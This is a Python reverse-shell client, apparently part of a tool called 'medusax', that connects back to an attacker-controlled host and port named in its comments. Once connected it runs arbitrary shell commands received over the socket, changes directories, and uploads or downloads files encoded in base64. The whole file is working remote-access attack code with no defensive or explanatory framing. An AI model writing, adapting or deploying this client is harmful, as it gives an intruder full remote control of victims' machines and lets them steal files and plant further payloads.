import socket
import subprocess
import os
import json
import base64

# Set up the target server and port (attacker's machine)
HOST = "127.0.0.1"  # Replace with the attacker's IP address
PORT = 4444  # Replace with the port the attacker is listening on

def execute_command(command):
    # Execute the command and return the result
    return subprocess.run(command, shell=True, capture_output=True)

def send_json(socket, data):
    json_data = json.dumps(data)
    socket.send(json_data.encode())

def receive_json(socket):
    json_data = ""
    while True:
        try:
            json_data = json_data + socket.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:
        file.write(base64.b64decode(content))
        return "[+] Upload successful [+]"

def read_file(path):
    with open(path, "rb") as file:
        return base64.b64encode(file.read()).decode()

# Create a socket object to connect back to the attacker
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Attempt to connect to the attacker's server
try:
    sock.connect((HOST, PORT))

    # Send an initial message to show the connection is established
    sock.sendall("Successfully connected to the client.\n".encode("utf-8"))

    default_prompt = "admin@medusax~$ "
    current_prompt = default_prompt
    in_shell_mode = False  # Tracks whether the client is in shell mode

    while True:
        # Send the current prompt to the server
        sock.sendall(current_prompt.encode("utf-8"))

        # Receive the command from the server
        command = sock.recv(1024).decode("utf-8").strip()

        # Handle the 'km' command to completely disconnect
        if command.lower() == "km":
            sock.sendall("Disconnecting...\n".encode("utf-8"))
            sock.close()
            break

        # Handle upload and download commands
        if command.startswith("upload"):
            try:
                _, filepath, file_content = receive_json(sock)
                response = write_file(filepath, file_content)
            except Exception:
                response = "[+] Error during upload [+]"
            send_json(sock, response)
            continue

        if command.startswith("download"):
            try:
                _, filepath = receive_json(sock)
                response = read_file(filepath)
            except Exception:
                response = "[+] Error during download [+]"
            send_json(sock, response)
            continue

        # Handle the 'shell' command to enter the shell mode
        if command.lower() == "shell":
            try:
                os.chdir("C:\\")
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall("Entering remote shell mode. Type 'exit' to leave.\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to switch to C:\\: {e}\n".encode("utf-8"))
            continue

        # Handle the 'shell -d <directory>' command to set a specific directory
        if command.startswith("shell -d"):
            try:
                _, _, directory = command.partition("-d")
                directory = directory.strip()
                os.chdir(directory)  # Change to the specified directory
                in_shell_mode = True  # Enable shell mode
                current_prompt = f"{os.getcwd()} > "
                sock.sendall(f"Changed directory to {directory}\n".encode("utf-8"))
            except Exception as e:
                sock.sendall(f"Failed to change directory: {e}\n".encode("utf-8"))
            continue

        # If in shell mode, process shell commands
        if in_shell_mode:
            if command.lower() == "exit":
                # Exit the shell and return to the default prompt
                in_shell_mode = False  # Disable shell mode
                current_prompt = default_prompt
                sock.sendall("Exiting remote shell mode.\n".encode("utf-8"))
                continue

            # Execute the received shell command
            output = execute_command(command)
            sock.sendall(output.stdout + output.stderr)
            continue

        # If not in shell mode, reject commands other than 'shell' or 'shell -d'
        sock.sendall("Invalid command. Use 'shell' to start a remote shell, 'shell -d <directory>' to set a start directory, or 'km' to disconnect.\n".encode("utf-8"))

except Exception as e:
    print(f"Error: {e}")
    sock.close()
